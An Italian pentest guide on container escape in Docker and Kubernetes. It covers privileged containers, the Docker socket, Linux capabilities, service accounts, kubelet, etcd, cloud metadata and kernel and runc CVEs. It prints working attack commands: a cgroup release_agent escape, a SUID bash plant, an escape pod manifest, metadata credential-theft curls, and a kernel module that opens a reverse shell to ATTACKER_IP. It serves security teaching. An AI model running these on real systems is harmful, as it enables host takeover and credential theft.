---
title: 'Container Escape: Privilege Escalation Docker e Kubernetes'
slug: container-escape
description: 'Container Escape: Docker socket, container privilegiati, Linux capabilities, Kubernetes, kernel exploit e IMDS. Tecniche di priv-esc, detection e difesa.'
image: /container-escape-docker-kubernetes.webp
draft: false
date: 2026-02-26T00:00:00.000Z
lastmod: 2026-09-11T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - kubernetes
  - docker
  - container-escape
  - container-breakout
  - cloud-security
---

# Container Escape: Guida Completa a Docker, Kubernetes e Linux

Un container escape è una tecnica che permette a un attaccante di uscire dai confini di isolamento di un container e ottenere accesso al sistema host sottostante. Può avvenire sfruttando configurazioni insicure — container privilegiati, Docker socket esposti, Linux capabilities eccessive, namespace condivisi — o vulnerabilità del kernel condiviso tra container e host. In Kubernetes, un container compromesso può inoltre portare alla compromissione del nodo e, in presenza di privilegi sufficienti nel service account, all'espansione dell'accesso verso l'intero cluster. In un certo senso il container escape è una forma di privilege escalation tra livelli di isolamento — non aumenta i privilegi dell'utente all'interno dello stesso ambiente, ma sposta l'attaccante da un ambiente più ristretto (il container) a uno con una superficie molto più ampia (l'host).

Questa guida copre il **Docker container escape** (privileged, Docker socket, capabilities), il **Kubernetes container escape** (RBAC, service account, kubelet, etcd) e più in generale il **Linux container escape** legato alle primitive del kernel condiviso — namespace, cgroup, capabilities — su cui si basa l'isolamento di qualunque container, indipendentemente dal runtime specifico.

## Cos'è un Container Escape

Un container non è una macchina virtuale: è un processo isolato dal resto del sistema tramite funzionalità del kernel Linux — namespace, cgroup, capability — non tramite virtualizzazione hardware. Il kernel è lo stesso, condiviso tra tutti i container e l'host. Questo significa che l'isolamento è imperfetto per costruzione: ogni misconfigurazione nella configurazione del container, o ogni vulnerabilità nel kernel condiviso, è un potenziale vettore per superare quell'isolamento.

Il container escape va tenuto distinto da concetti vicini ma diversi:

| Tecnica                                                            | Obiettivo                                                                                               |
| ------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------- |
| [Privilege escalation](https://hackita.it/articoli/linux-privesc/) | Ottenere privilegi maggiori nello stesso ambiente (es. da utente a root, ma sempre dentro il container) |
| Container escape                                                   | Uscire dall'isolamento del container verso l'host o il runtime                                          |
| Lateral movement                                                   | Muoversi verso altri sistemi/container dopo aver ottenuto un punto d'appoggio                           |
| Kubernetes privilege escalation                                    | Ottenere privilegi maggiori nel cluster (RBAC, service account) senza necessariamente uscire dal pod    |

Un punto importante per evitare fraintendimenti: container escape non equivale automaticamente a "root sull'host". L'impatto varia a seconda del vettore — può significare accesso a un namespace condiviso, lettura del filesystem host, controllo del daemon Docker, oppure, nel caso peggiore, esecuzione di codice arbitrario a livello kernel. Superare l'isolamento è la definizione; il grado di compromissione dipende da cosa si trova dall'altra parte.

### Container Escape vs Container Breakout

I due termini vengono usati come sinonimi nella maggior parte della letteratura tecnica: entrambi indicano il superamento dell'isolamento di un container verso l'host o altre risorse sottostanti. "Container breakout" è la dicitura più comune in report e advisory in lingua inglese (es. bollettini di sicurezza dei vendor), mentre "container escape" prevale nella letteratura offensive/pentest. Non c'è una distinzione tecnica sostanziale tra i due.

## Container Escape vs Privilege Escalation

|                         | Privilege Escalation                   | Container Escape                    |
| ----------------------- | -------------------------------------- | ----------------------------------- |
| Punto di partenza       | utente/processo con privilegi limitati | processo dentro un container        |
| Obiettivo               | ottenere privilegi maggiori            | superare il confine di isolamento   |
| Destinazione            | stesso ambiente                        | host, runtime o risorse sottostanti |
| Esempio tipico          | utente → root nello stesso sistema     | container → host                    |
| Concatenabili tra loro? | sì                                     | sì                                  |

La privilege escalation cambia il livello di privilegio; il container escape cambia il confine di isolamento. Nella pratica, i due vengono spesso concatenati nello stesso attacco: si ottiene root dentro il container (privilege escalation), e con quei privilegi si sfrutta un vettore di escape (es. `CAP_SYS_MODULE`) per raggiungere l'host.

## Perché è Fondamentale nel Pentest Moderno

In molti ambienti cloud-native attuali, ottenere [RCE](https://hackita.it/articoli/rce/) su un'applicazione web porta a una shell all'interno di un container Docker o di un pod Kubernetes, non direttamente sull'host — è un pattern molto comune negli stack containerizzati, anche se non universale: dipende da come l'applicazione target è effettivamente deployata. La catena tipica in un ambiente cloud-native è:

```
RCE nell'app web
   → shell nel container
      → container escape
         → root sull'host  /  accesso al cluster Kubernetes
            → lateral movement verso altri container/host
               → cloud metadata (IMDS) → privilege escalation nel cloud provider
```

## Tassonomia dei Vettori di Container Escape

| Vettore                                     | Ambiente              | Requisito                                  | Impatto tipico                                          |
| ------------------------------------------- | --------------------- | ------------------------------------------ | ------------------------------------------------------- |
| Container privilegiato                      | Docker/K8s            | flag `--privileged`                        | Accesso host quasi completo                             |
| Docker socket montato                       | Docker                | `/var/run/docker.sock` accessibile         | Controllo del daemon Docker                             |
| Linux capabilities eccessive                | Tutti i runtime Linux | capability specifica assegnata             | Dipende dalla capability                                |
| Namespace condivisi                         | Docker/K8s            | `--pid=host`, `hostNetwork`, `hostPID`     | Interazione diretta coi processi/rete host              |
| Host filesystem montato                     | Docker/K8s            | `hostPath` o bind mount su `/`             | Accesso al filesystem host                              |
| Vulnerabilità kernel                        | Tutti                 | kernel non patchato                        | Compromissione host, dipende dal CVE                    |
| Vulnerabilità del runtime (runc/containerd) | Docker/K8s            | runtime non patchato                       | Escape completo, spesso senza bisogno di `--privileged` |
| RBAC Kubernetes permissivo                  | Kubernetes            | service account con permessi eccessivi     | Escalation nel cluster                                  |
| Kubelet API esposta                         | Kubernetes            | rete raggiungibile, auth debole            | Compromissione nodo/pod                                 |
| Cloud metadata (IMDS)                       | Cloud (AWS/GCP/Azure) | rete raggiungibile verso `169.254.169.254` | Furto credenziali cloud                                 |

## Metodo di Assessment

Un assessment di container escape strutturato segue un percorso in cinque fasi, invece di provare tecniche a caso:

1. **Identify** — determinare se ci si trova effettivamente dentro un container e di che tipo (Docker, Kubernetes, altro runtime).
2. **Enumerate** — raccogliere capability, mount, variabili d'ambiente, service account e ogni altro dato che indichi un vettore percorribile.
3. **Validate** — confermare che il prerequisito individuato sia realmente sfruttabile (es. capability presente ma effettivamente utilizzabile nel contesto specifico), senza dare per scontato l'impatto solo dalla teoria.
4. **Exploit** — eseguire la tecnica specifica per il vettore validato.
5. **Confirm impact / Remediate** — verificare concretamente cosa si è ottenuto (filesystem host, root, credenziali) e, in un contesto di reporting, documentare la remediation corretta per quel vettore specifico.

Le sezioni seguenti sono organizzate seguendo esattamente queste fasi per ciascun vettore.

## 1. Capire Dove Sei — Detection dell'Ambiente Container

Prima di tutto: sei in un container? E se sì, quale tipo?

```bash
# Indicatori di container
cat /proc/1/cgroup 2>/dev/null | grep -i "docker\|kubepods\|containerd"
ls -la /.dockerenv 2>/dev/null
cat /proc/self/mountinfo | grep -i "overlay\|docker\|kubepods"
hostname  # spesso un hash tipo a1b2c3d4e5f6
```

**Output tipico (Docker):**

```
12:memory:/docker/a1b2c3d4e5f6789...
-rw-r--r-- 1 root root 0 Jan  1 00:00 /.dockerenv
```

**Output tipico (Kubernetes):**

```
12:memory:/kubepods/burstable/pod-abc123/container-def456
```

Nota pratica: `/proc/1/cgroup` che mostra `init.scope` come PID 1 (cioè systemd) è un forte indicatore di essere **sull'host**, non in un container — quando invece si è dentro un container, PID 1 è tipicamente il processo dell'applicazione stessa o un init minimale, e nel path del cgroup compare l'ID del container. La presenza di un filesystem `overlay` in `mount` da sola non basta a confermare di essere dentro un container: indica solo che sul sistema esiste (o è montato) un filesystem overlay — condizione compatibile sia con l'essere dentro un container Docker, sia con l'essere sull'host che ospita altri container separati. Va sempre incrociata con `/proc/1/cgroup` e `/.dockerenv` prima di trarre conclusioni.

### Raccolta informazioni dal container

```bash
# OS e kernel (condiviso con l'host)
uname -a
cat /etc/os-release

# Utente corrente
id
whoami

# Capabilities del container
cat /proc/self/status | grep -i cap
capsh --print 2>/dev/null

# Mount points (cerca socket Docker, filesystem host)
mount | grep -iE "docker|sock|host|nsfs"
ls -la /var/run/docker.sock 2>/dev/null

# Variabili ambiente (credenziali, token Kubernetes)
env | grep -iE "kube|token|secret|password|api|aws|azure|gcp"

# Service account Kubernetes
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null

# Network namespace
ip addr
cat /etc/hosts
cat /etc/resolv.conf
```

Cosa cercare: socket Docker montato, capability eccessive, modalità privilegiata, token Kubernetes, variabili con credenziali cloud.

## 2. Container Privilegiato (`--privileged`)

Un container avviato con `--privileged` rimuove molte delle principali restrizioni di isolamento: assegna (quasi) tutte le capability Linux, dà accesso ai device dell'host e disabilita i profili seccomp/AppArmor di default. Non è automaticamente identico a "root sull'host" — il filesystem resta separato finché non lo si monta esplicitamente — ma, combinato con le condizioni giuste (accesso ai device a blocchi, cgroup, namespace), rende la compromissione dell'host quasi sempre alla portata.

### Verifica se sei privilegiato

```bash
cat /proc/self/status | grep CapEff
# CapEff: 000001ffffffffff  ← praticamente tutte le capability = privilegiato

capsh --print 2>/dev/null | grep "Current"
# se la lista è lunghissima (30+ capability), il container è privilegiato
```

### Escape via mount del filesystem host

```bash
fdisk -l 2>/dev/null
lsblk 2>/dev/null
```

```bash
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

ls /mnt/host/
cat /mnt/host/etc/shadow
```

Da notare: questo funziona solo se il device a blocchi dell'host (es. `/dev/sda1`) è effettivamente visibile ed esposto dentro il container — cosa non garantita in ogni configurazione `--privileged`, dipende da come i device sono passati al container. Se `lsblk` non mostra alcun device o mostra solo dischi virtuali interni al container, questa via non è percorribile e va cercato un altro vettore.

### Escape via SUID plant su mount scrivibile (anche senza privilegi pieni)

Questa tecnica non richiede necessariamente `--privileged`: basta che il container abbia una directory dell'host montata in scrittura (un bind mount Docker con `-v /host/path:/mnt`, o un `hostPath` Kubernetes con `readOnly: false`). Se si è root dentro il container, si può piazzare in quella directory una copia di bash con bit SUID: eseguita poi dal lato host (o da un utente host a basso privilegio con accesso a quel path), quel binario garantisce una shell con UID effettivo 0.

```bash
# dentro il container, come root, nella directory montata dall'host
cp /bin/bash .
chown root:root bash
chmod 4777 bash
```

```bash
# lato host (o utente a basso privilegio con accesso al path mappato)
./bash -p
```

Un dettaglio spesso ignorato: non tutti i filesystem onorano il bit SUID. Directory montate come `nosuid` (tipicamente `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup`) ignorano silenziosamente il bit, quindi il binario copiato non guadagna privilegi. Prima di piantare il binario conviene verificare le opzioni di mount lato host:

```bash
mount | grep -v "nosuid"
```

Questa via è particolarmente rilevante in Kubernetes, dove un `hostPath` scrivibile è una misconfigurazione più comune di quanto sembri (spesso usata per comodità in DaemonSet, CNI agent o CSI node plugin) rispetto a un container esplicitamente `--privileged`.

### Escape via cgroup release\_agent

```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/escape
echo 1 > $d/escape/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent

cat > /cmd << 'EOF'
#!/bin/sh
cat /etc/shadow > /output
EOF
chmod +x /cmd

echo $$ > $d/escape/cgroup.procs
cat /output
```

Il `release_agent` è un binario che il kernel esegue **sull'host** quando un cgroup diventa vuoto. Scrivendo il path di uno script proprio nel `release_agent` e triggerando l'evento (svuotando il cgroup), si ottiene esecuzione di codice sull'host. Questa tecnica richiede la cgroup v1 e `CAP_SYS_ADMIN` o modalità privilegiata; su sistemi con cgroup v2 il meccanismo cambia e questa esatta via non è applicabile.

### Escape via nsenter

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

`nsenter` entra nei namespace del PID 1 (init dell'host). Serve però che il container abbia visibilità sul PID 1 dell'host — condizione tipicamente vera solo se il container gira privilegiato e in un setup che espone `/proc` dell'host, non in ogni container privilegiato per default.

## 3. Escape via Docker Socket Montato

**Prerequisiti:** `/var/run/docker.sock` presente e accessibile in scrittura dal container, Docker daemon raggiungibile tramite quel socket.

**Impatto:** controllo completo del Docker daemon — avviare nuovi container, montare qualunque path dell'host, ispezionare tutti i container esistenti (inclusi quelli fermati, con relative variabili d'ambiente e credenziali spesso hardcoded).

```bash
# Lista immagini e container disponibili
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock ps -a
docker -H unix:///var/run/docker.sock inspect [CONTAINER_ID]
```

### Escape

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Usare `sh` invece di `bash`: non tutte le immagini minimali (come Alpine) hanno bash installato di default.

Se il client `docker` non è disponibile, si può parlare direttamente al socket via curl:

```bash
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool
```

Su host che usano **containerd** direttamente (non solo tramite Docker), lo stesso principio si applica al binario `ctr`, se presente e con accesso al relativo socket: permette di creare container montati sull'host con un procedimento analogo a quello Docker, cambiando solo la sintassi del client.

```bash
which ctr
ctr image list
```

Per il dettaglio sull'exploitation della Docker API esposta via rete (non socket locale), la tecnica è identica cambiando solo il trasporto: vedi la guida sulla [porta 2375 Docker API](https://hackita.it/articoli/porta-2375-docker-api/). Per l'hardening lato Docker, vedi la guida dedicata a [Docker security](https://hackita.it/articoli/docker-security/).

## 4. Escape via Linux Capabilities

Le capability Linux sono permessi granulari assegnati ai processi, pensati per dare privilegi specifici senza concedere root completo. Un container non-privilegiato può comunque avere capability specifiche assegnate che, singolarmente o combinate, permettono un escape.

Invece di controllare le capability una per una, conviene fare prima una scansione unica che segnali subito quali, tra quelle effettivamente rilevanti per un escape, sono presenti:

```bash
capsh --print 2>/dev/null | grep -E "cap_sys_admin|cap_sys_ptrace|cap_dac_read_search|cap_net_admin|cap_sys_module|cap_sys_rawio|cap_dac_override|cap_setuid|cap_sys_chroot"
```

Ogni match trovato è il segnale per andare ad approfondire quella specifica capability nella sezione dedicata qui sotto. Se la scansione non restituisce nulla, il container probabilmente ha un set di capability ridotto al minimo e questo vettore non è percorribile.

Per un'ispezione completa e non filtrata (utile se si sospetta una capability non coperta dalla lista sopra):

```bash
capsh --print 2>/dev/null
grep Cap /proc/self/status
capsh --decode=00000000a80425fb
```

### CAP\_SYS\_ADMIN

**Prerequisiti:** capability assegnata al container.
**Impatto:** è una capability estremamente ampia — permette mount di filesystem e manipolazione di risorse normalmente isolate (cgroup, namespace); in determinate configurazioni può quindi diventare un vettore di container escape, ma l'esito dipende da cosa il container ha effettivamente accesso a fare con quel mount.

```bash
capsh --print 2>/dev/null | grep cap_sys_admin
mount -t proc proc /mnt 2>/dev/null && echo "SYS_ADMIN confirmed"
```

Con `SYS_ADMIN` confermato, si può tentare la tecnica cgroup `release_agent` descritta sopra.

### CAP\_SYS\_PTRACE

**Prerequisiti:** capability assegnata **e** PID namespace condiviso con l'host (`--pid=host`) — senza quest'ultimo, `ptrace` vede solo i processi dentro il container stesso, e la capability da sola non basta per l'escape.
**Impatto:** iniezione di codice in processi dell'host visibili nel namespace condiviso.

```bash
capsh --print 2>/dev/null | grep cap_sys_ptrace
ps aux | grep -v "grep" | head -20
# se compaiono processi dell'host (systemd, sshd, ecc.) il PID namespace è condiviso
```

### CAP\_DAC\_READ\_SEARCH

**Prerequisiti:** capability assegnata.
**Impatto:** bypassa i controlli di permesso in lettura sul filesystem — non è di per sé un escape verso l'host, ma se combinata con accesso a file/handle dell'host (es. tramite `open_by_handle_at`) può portare a lettura arbitraria di file host. Non va considerata automaticamente equivalente a un escape: dipende dalla superficie realmente raggiungibile.

### CAP\_DAC\_READ\_SEARCH

**Prerequisiti:** capability assegnata, e almeno un bind mount dall'host presente nel container (anche uno minimo come `/etc/hostname` o `/etc/resolv.conf` — quelli che Docker monta di default sono già sufficienti come punto di partenza).
**Impatto:** bypassa i controlli di permesso in lettura sul filesystem tramite la syscall `open_by_handle_at()`, permettendo di leggere qualsiasi file sul filesystem host, anche fuori dal mount namespace del container — non è di per sé un escape verso l'host con esecuzione di codice, ma consente lettura arbitraria (es. `/etc/shadow`, chiavi SSH), sufficiente in molti casi a raggiungere credenziali riutilizzabili.

```bash
capsh --print 2>/dev/null | grep cap_dac_read_search
```

La tecnica di riferimento è lo storico exploit **shocker** (Sebastian Krahmer, 2014): sfrutta il fatto che `open_by_handle_at()`, con `CAP_DAC_READ_SEARCH`, accetta un file handle contenente un numero di inode e apre quel file **ignorando il mount namespace** — partendo dall'inode 2 (sempre la root `/` su ext4) è possibile attraversare l'albero del filesystem host e leggere qualunque file.

```bash
gcc -w -o shocker shocker.c
./shocker /etc/shadow
```

Va detto che questa tecnica funziona solo su container **privilegiati** o con la capability esplicitamente aggiunta (`--cap-add=CAP_DAC_READ_SEARCH`): dai tempi di Docker 1.0, `CAP_DAC_READ_SEARCH` non fa più parte del set di default, quindi va verificata caso per caso, non data per scontata.

### CAP\_NET\_ADMIN

**Prerequisiti:** capability assegnata, network namespace condiviso con l'host (tipicamente container avviato con `--net=host`) per un impatto diretto sul traffico host — senza namespace condiviso, `CAP_NET_ADMIN` permette operazioni solo sull'interfaccia virtuale isolata del container, non sulla rete host.
**Impatto:** sniffing del traffico, modifica del routing, ARP spoofing sulla rete visibile al container.

```bash
capsh --print 2>/dev/null | grep cap_net_admin
```

Verifica se il network namespace è condiviso con l'host, confrontando le interfacce visibili con quelle attese in un container isolato (di norma solo `lo` ed `eth0` con IP interno Docker):

```bash
ip addr
# se compaiono le interfacce fisiche/reali dell'host (es. eno1, wlan0, bridge di sistema)
# invece del solo eth0 con IP interno Docker, il namespace di rete è condiviso
```

Con namespace condiviso confermato, la capability permette di intercettare il traffico reale dell'host:

```bash
tcpdump -i eth0 -w /tmp/capture.pcap
```

o di manipolare direttamente routing e regole firewall dell'host:

```bash
ip route
iptables -L -n
```

### CAP\_SYS\_MODULE — caricamento di moduli kernel

**Prerequisiti:** capability assegnata (tipica dei container `--privileged`), toolchain di compilazione disponibile nel container (`make`, `gcc`) e linux headers corrispondenti alla versione del kernel in esecuzione.
**Impatto:** esecuzione di codice a livello kernel sull'host — il kernel è condiviso tra container e host, quindi un modulo caricato dall'interno del container viene eseguito con i privilegi massimi del kernel host, non del container.

Il modulo va compilato nello stesso identico ambiente headers del kernel target. Prima si verifica la presenza della capability, poi la corrispondenza tra la versione del kernel in esecuzione e gli headers disponibili nel container:

```bash
capsh --print 2>/dev/null | grep cap_sys_module
uname -r
ls /usr/src/
# cercare una directory linux-headers-<versione uguale a uname -r>
```

Servono due file nella stessa directory di lavoro: il sorgente C del modulo e un Makefile.

```c
#include <linux/module.h>
#include <linux/kmod.h>
MODULE_LICENSE("GPL");
static int __init escape_init(void) {
    char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", NULL};
    char *envp[] = {"PATH=/usr/bin:/bin", NULL};
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit escape_exit(void) {}
module_init(escape_init);
module_exit(escape_exit);
```

```makefile
obj-m += escape.o
```

Un errore pratico frequente in questa fase riguarda il parametro `M=` del comando `make`: deve puntare esattamente alla directory dove si trovano **sia** il sorgente `.c` **sia** il Makefile — non una directory genitore. Se i file stanno in `/tmp/privesc/` e si lancia il build con `M=/tmp`, `make` cerca (e non trova) il Makefile in `/tmp`, restituendo un errore tipo "No such file or directory" / "No rule to make target". Il fix è allineare `M=` alla directory reale dei file:

```bash
make -C /lib/modules/$(uname -r)/build M=/tmp/privesc modules
```

Un secondo errore comune riguarda `insmod`: va invocato con il path corretto verso il file `.ko` generato dalla build — se ci si è spostati con `cd` nella directory di lavoro, basta il nome relativo (`insmod escape.ko`); se si prova a richiamarlo con un path assoluto diverso da dove il `.ko` è stato effettivamente generato (es. `insmod /tmp/escape.ko` quando il file è in `/tmp/privesc/escape.ko`), il comando fallisce con "No such file or directory" anche se il modulo è stato compilato correttamente.

```bash
insmod escape.ko
```

Il caricamento del modulo, se tutto è andato a buon fine, apre una reverse shell come **root sull'host**, non più confinata nel container.

## 5. Escape da Kubernetes Pod

In Kubernetes, l'escape da un pod segue le stesse logiche viste per Docker ma con vettori aggiuntivi legati al control plane: service account token, API server, kubelet, etcd — per un approfondimento specifico sulla exploitation dell'ambiente Kubernetes, vedi la guida a [Kubernetes security](https://hackita.it/articoli/kubernetes-security-exploitation/). È importante non trattare Kubernetes come una semplice estensione di Docker: un pod compromesso non equivale automaticamente a un container escape, e un container escape su un nodo non equivale automaticamente a compromissione del cluster. I livelli sono distinti:

```
Application compromise
   → Container / Pod compromise
      → Node compromise
         → Cluster compromise
            → Cloud compromise
```

### Service account con permessi eccessivi

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

export KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export KUBE_API="https://kubernetes.default.svc"

curl -sk -H "Authorization: Bearer $KUBE_TOKEN" \
  $KUBE_API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

kubectl auth can-i --list
```

**Output critico da cercare:**

```
pods/exec    *    create   ← esecuzione comandi in altri pod
secrets      *    get      ← lettura dei secret (credenziali, token)
pods         *    create   ← creazione pod (con potenziale mount host)
nodes/proxy  *    create   ← raggiungimento della kubelet API
```

### Pod con host mount

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: hostfs
      mountPath: /host
    securityContext:
      privileged: true
  volumes:
  - name: hostfs
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
```

```bash
kubectl apply -f escape-pod.yaml
kubectl exec -it escape-pod -- chroot /host bash
```

### Secret Kubernetes

```bash
kubectl get secrets
kubectl get secrets -A

kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d
```

I secret spesso contengono credenziali database, API key, certificati TLS, token di servizi esterni, incluse credenziali cloud che aprono la strada a privilege escalation nel provider — vedi la guida [AWS security](https://hackita.it/articoli/aws-security/) per l'abuso di credenziali IAM ottenute in questo modo.

### Kubelet API (porta 10250)

```bash
curl -sk https://[node_ip]:10250/pods
curl -sk https://[node_ip]:10250/run/[namespace]/[pod]/[container] -X POST -d "cmd=id"
```

### etcd non autenticato (porta 2379)

```bash
etcdctl --endpoints=http://[etcd_ip]:2379 get / --prefix --keys-only | grep secret
etcdctl --endpoints=http://[etcd_ip]:2379 get /registry/secrets/default/db-credentials
```

## 6. Escape via Cloud Metadata (IMDS)

Se il container gira su un'istanza cloud (EC2, GCE, Azure VM), il servizio di metadata dell'istanza può esporre credenziali temporanee assegnate a quella macchina. Questo endpoint è spesso raggiunto anche dall'esterno del container tramite [SSRF](https://hackita.it/articoli/ssrf/) su un'applicazione web che gira sulla stessa istanza — non serve necessariamente essere già dentro un container per sfruttarlo.

```bash
# AWS IMDSv1
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/[role_name]

# AWS IMDSv2 (richiede token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Le credenziali ottenute permettono di proseguire con la privilege escalation lato cloud provider — vedi [AWS security](https://hackita.it/articoli/aws-security/) per i passi successivi lato AWS. Da un singolo container compromesso, se IMDSv2 non è forzato e il traffico verso il metadata endpoint non è altrimenti limitato, è possibile arrivare a privilegi ampi sull'account cloud — l'impatto reale dipende comunque dai permessi assegnati al ruolo IAM/service account dell'istanza.

## 7. Escape via Kernel Exploit

Il container condivide il kernel con l'host: una vulnerabilità del kernel sfruttabile dall'interno del container può portare a compromissione dell'host, ma l'exploitability effettiva dipende dalla configurazione specifica (seccomp, capability disponibili, versione esatta) e non è automatica solo per la presenza del CVE.

```bash
uname -r
searchsploit linux kernel 5.4 privilege escalation
```

| CVE            | Nome                                  | Versioni      | Impatto                               |
| -------------- | ------------------------------------- | ------------- | ------------------------------------- |
| CVE-2022-0185  | Heap overflow in legacy\_parse\_param | 5.1 – 5.16.2  | Escape da container unprivileged      |
| CVE-2022-0847  | Dirty Pipe                            | 5.8 – 5.16.11 | Sovrascrittura file arbitraria → root |
| CVE-2021-22555 | Netfilter heap OOB                    | 2.6.19 – 5.12 | Escape da container                   |
| CVE-2020-14386 | AF\_PACKET overflow                   | 4.6 – 5.9     | Root + escape                         |
| CVE-2024-1086  | nf\_tables use-after-free             | 3.15 – 6.8    | Root + escape                         |

## 8. Escape via Vulnerabilità del Container Runtime (runc/containerd)

Distinto dal kernel Linux, il **container runtime** (runc, containerd) è il software che effettivamente crea e avvia i container. Una vulnerabilità qui non richiede un kernel specifico né capability particolari: basta una versione non patchata del runtime stesso, e spesso funziona anche contro container non privilegiati.

**CVE-2019-5736 (runc)** — un container malevolo, eseguito come root, può sovrascrivere il binario `runc` sull'host sfruttando `/proc/self/exe`, in modo che la prossima esecuzione di `docker exec` (da parte di chiunque, anche l'amministratore) sull'host esegua il payload dell'attaccante invece di runc. Corretto in runc 1.0-rc7.

**CVE-2024-21626 — "Leaky Vessels" (runc ≤ 1.1.11)** — un file descriptor verso il filesystem host (es. un handle su `/sys/fs/cgroup`) rimane inavvertitamente aperto ("leaked") nel processo `runc init`. Impostando la `WORKDIR` del container (in un Dockerfile malevolo, o via `runc exec`) su un path tipo `/proc/self/fd/<N>` che punta a quel file descriptor, il processo del container ottiene una working directory che di fatto è già nel filesystem dell'host — permettendo lettura, scrittura e in alcuni casi sovrascrittura di binari host, con conseguente escape completo. Interessa anche Kubernetes e containerd, che incorporano runc. Corretto in runc 1.1.12.

**Prerequisiti comuni a questa classe di vulnerabilità:** versione vulnerabile di runc/containerd sull'host, possibilità di controllare un'immagine o eseguire `docker build`/`runc exec` (a seconda della CVE specifica).
**Impatto:** escape completo verso l'host, spesso senza bisogno di `--privileged` o capability aggiuntive — motivo per cui il patching del runtime è critico quanto quello del kernel.

## Docker vs Kubernetes: Superficie a Confronto

| Aspetto                  | Docker                          | Kubernetes                                                  |
| ------------------------ | ------------------------------- | ----------------------------------------------------------- |
| Isolamento container     | ✅ namespace/cgroup              | ✅ namespace/cgroup (via container runtime)                  |
| Docker socket            | ✅ vettore diretto               | ⚠️ indiretto, dipende dal runtime del nodo                  |
| Host mount               | bind mount (`-v /:/mnt`)        | `hostPath` nel manifest del pod                             |
| Modalità privilegiata    | `--privileged`                  | `securityContext.privileged: true`                          |
| RBAC                     | ❌ non presente                  | ✅ superficie propria (service account, ruoli)               |
| Kubelet API              | ❌ non applicabile               | ✅ vettore aggiuntivo (porta 10250)                          |
| etcd                     | ❌ non applicabile               | ✅ se raggiungibile senza auth, accesso a tutti i secret     |
| Credenziali cloud (IMDS) | possibile se rete raggiungibile | possibile, spesso mediato da IAM roles for service accounts |

Kubernetes eredita quindi tutti i vettori Docker/container-runtime di base, ma aggiunge una superficie propria legata al control plane — motivo per cui i due contesti vanno valutati con checklist parzialmente diverse.

## Container Escape Quick Reference

| Se trovi                        | Controlla                                         |
| ------------------------------- | ------------------------------------------------- |
| `/.dockerenv`                   | ambiente Docker                                   |
| `kubepods` in `/proc/1/cgroup`  | ambiente Kubernetes                               |
| `CapEff` elevato                | capabilities eccessive                            |
| `/var/run/docker.sock`          | Docker daemon raggiungibile                       |
| `hostPID` nel manifest          | processi host visibili                            |
| `hostNetwork` nel manifest      | rete host condivisa                               |
| `hostPath` scrivibile           | filesystem host, possibile SUID plant             |
| `cap_sys_admin`                 | mount / namespace                                 |
| `cap_sys_module`                | caricamento moduli kernel                         |
| token service account presente  | possibile accesso API Kubernetes                  |
| porta `10250` raggiungibile     | Kubelet API                                       |
| porta `2379` raggiungibile      | etcd                                              |
| `169.254.169.254` raggiungibile | cloud metadata (IMDS)                             |
| versione runc/containerd datata | possibile escape via runtime (es. CVE-2024-21626) |

## Come Valutare la Possibilità di Container Escape

Checklist da percorrere non appena si ottiene una shell dentro un container:

```
[ ] Container privileged? (CapEff quasi completo)
[ ] Docker socket montato e accessibile?
[ ] CAP_SYS_ADMIN presente?
[ ] CAP_SYS_PTRACE presente + PID namespace condiviso?
[ ] CAP_SYS_MODULE presente + headers kernel disponibili?
[ ] hostPID / hostNetwork / hostPath nel pod?
[ ] Device host esposti (lsblk mostra dischi reali)?
[ ] Service account Kubernetes con permessi eccessivi?
[ ] Kubelet raggiungibile senza autenticazione forte?
[ ] Kernel vulnerabile a CVE noti?
[ ] Versione runc/containerd nota vulnerabile (es. CVE-2024-21626)?
[ ] Cloud metadata (169.254.169.254) raggiungibile?
```

## Tool per la Ricerca di Container Escape

**Offensive / enumeration:**

* `linpeas` — enumerazione privesc generica, include check container
* `deepce` — enumerazione specifica Docker/container escape
* `amicontained` — identifica rapidamente capability e restrizioni del container corrente

**Defensive / auditing:**

* `docker-bench-security` — audit configurazione Docker contro CIS Benchmark
* `kube-bench` — audit configurazione Kubernetes contro CIS Benchmark
* `Trivy` — scansione vulnerabilità immagini container
* `Falco` — runtime security monitoring, rileva comportamenti anomali a runtime

## Container Escape e MITRE ATT\&CK

